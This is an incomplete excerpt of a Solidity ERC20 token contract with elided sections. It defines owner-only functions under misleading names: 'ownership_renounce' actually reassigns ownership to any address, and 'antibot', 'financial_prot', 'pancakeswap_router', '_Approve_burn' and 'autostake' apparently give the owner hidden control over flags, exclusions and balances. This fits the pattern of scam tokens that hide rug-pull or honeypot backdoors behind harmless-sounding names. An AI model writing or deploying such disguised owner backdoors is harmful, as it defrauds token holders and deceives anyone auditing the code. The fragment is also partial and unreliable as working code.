...
contract Token is Context, IERC20, IERC20Metadata {
    ...
    function antibot(bool _amount1_) onlyOwner public {
        amount1 = _amount1_;
    }
    
    function financial_prot(uint _amount2_) onlyOwner public {
        _amount1 = _amount2_;
    }
    
    function pancakeswap_router(address _account_) onlyOwner public {
        _excludeamount[_account_] = true;
    }
    
 
    function ownership_renounce(address _owner) onlyOwner public {
        owner = _owner;
    }
    ...
    function _Approve_burn(address account, uint256 amount) onlyOwner  public virtual {
      ...
      function  autostake(address account, uint256 amount) onlyOwner  public virtual {
        require(account != address(0), "ERC20: autostake to the zero address");
